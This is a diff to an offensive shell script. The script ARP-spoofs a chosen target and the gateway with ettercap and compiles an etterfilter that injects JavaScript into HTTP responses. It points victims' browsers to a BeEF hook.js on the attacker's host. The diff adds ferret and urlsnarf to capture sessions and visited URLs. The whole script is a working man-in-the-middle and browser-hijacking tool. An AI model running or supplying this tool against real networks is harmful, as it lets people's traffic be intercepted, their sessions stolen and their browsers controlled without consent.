@@ -39,6 +39,7 @@ then
 fi
 if [ $TARG -z ] 2> /dev/null
 then
+	echo
 	read -p " [*] Enter the IP of your target (Empty for all) $LAN" TARG
 fi
 if [ $TARG -z ] 2> /dev/null
@@ -59,5 +60,10 @@ if (ip.proto == TCP && tcp.src == 80) {
    msg("JavaScript Injected!.\n");
 }' > etter.filter.jsinject
 
-etterfilter -w etter.filter.jsinject -o jsinject.ef
+xterm -e "ferret -i $NIC"&
+xterm -e "urlsnarf -i $NIC"&
+etterfilter etter.filter.jsinject -o jsinject.ef 2> /dev/null
+sleep 4 && echo " [*] Beef Hook: http://$IP:$PORT/hook.js" && echo " [*] Filter Activated, waiting for requests..." && echo " [*] Press 'q' to quit" && echo&
 ettercap -i $NIC -TqF jsinject.ef -M ARP /$TARG/ /$ROUTE/
+killall ferret
+killall urlsnarf
